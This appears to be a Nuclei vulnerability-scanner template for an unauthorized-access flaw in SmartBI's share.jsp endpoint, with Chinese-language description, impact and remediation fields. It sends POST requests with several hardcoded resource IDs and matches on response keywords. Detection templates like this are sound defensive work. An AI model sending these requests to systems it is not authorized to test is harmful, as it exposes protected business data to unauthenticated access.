id: smartbi-share-session
info:
  name: SmartBI share.jsp 接口 - 未授权访问漏洞
  author: Chaitin
  severity: high
  description: |
    该模板用于检测 SmartBI share.jsp 接口 - 未授权访问漏洞。该类漏洞通常源于认证、授权或会话校验逻辑不完整，使未授权用户可访问受保护接口或执行敏感操作。模板会向 `/vision/share.jsp` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可绕过登录或权限限制，访问管理功能、敏感数据或业务操作接口。
    - 在管理接口暴露的场景下，可能进一步导致配置被篡改、账号被接管或系统被植入后门。
  remediation: |
    - 在服务端统一执行认证和授权校验，避免仅依赖前端控制或可预测参数。
    - 修复存在绕过问题的版本，并限制管理接口、调试接口和敏感 API 的访问来源。
    - 审计异常登录、权限变更和配置修改记录，轮换可能受影响的账号凭据。
  metadata:
    verified: true
    max-request: 1
    vendor: smartbi
    product: smartbi
  tags: unauth,vuln,smartbi
http:
  - method: POST
    path:
      - '{{BaseURL}}/vision/share.jsp'
    redirects: true
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: resid={{value}}
    payloads:
      value:
        - 96a0a9d0b86f90d5416d013f4cfe2f23
        - Iff808081017e7bff7bff1888017e8108eeec09bb
        - b904ab9f5a84712a672523a7b4881ee4
        - c9c298ba657587c42cba00490b5b07a9
        - Iff808081017ee2a0e2a05606017ee66b4a312301
    attack: batteringram
    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "openresource.jsp") && contains(body, ''shareContent'')'
